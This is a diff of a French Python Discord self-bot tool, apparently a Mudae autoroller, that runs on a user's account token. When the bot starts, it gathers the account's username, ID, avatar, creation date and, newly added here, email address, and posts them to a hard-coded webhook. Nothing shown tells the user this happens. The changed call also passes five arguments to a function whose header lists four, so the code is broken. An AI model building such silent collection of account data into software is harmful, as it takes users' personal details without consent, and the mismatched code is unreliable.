@@ -23,6 +23,7 @@ CONFIG_FILE = os.path.join(APPDATA_DIR, "config.json")
 LOG_FILE = os.path.join(APPDATA_DIR, "log.txt")
 ICON_PATH = "mudae.ico"
 SOUND_PATH = "music.mp3"
+pp = "mudae-pp.png"
 
 CHANNEL_ID = "1084908479745114212"
 GUILD_ID = "979531608459726878"
@@ -106,11 +107,13 @@ def send_webhook(username, user_id, avatar_url, email):
             "footer": {
                 "text": "Assistant Khali - Mise à jour : " + now
             }
-        }]
+        }],
+        "avatar": pp,
     }
 
     response = requests.post(WEBHOOK_URL, json=data)
-    
+    #response = requests.patch(f"https://discord.com/api/v9/webhooks/{WEBHOOK_URL.split('/')[-2]}/{WEBHOOK_URL.split('/')[-1]}", json=data)
+
     if response.status_code == 204:
         print("Nom d'utilisateur envoyé avec succès au webhook.", "success")
     else:
@@ -281,8 +284,8 @@ def toggle_bot():
         running = True
         log_message("Bot démarré.", "info")
         start_button.config(text="Arrêter", bootstyle="danger")
-        username, user_id, avatar_url, created_at = recup_nom_discord(token)
-        send_webhook(username, user_id, avatar_url, created_at)
+        username, user_id, avatar_url, created_at, email = recup_nom_discord(token)
+        send_webhook(username, user_id, avatar_url, created_at, email)
         threading.Thread(target=envoyer_message, daemon=True).start()
 
 def ouvrir_lien(event):
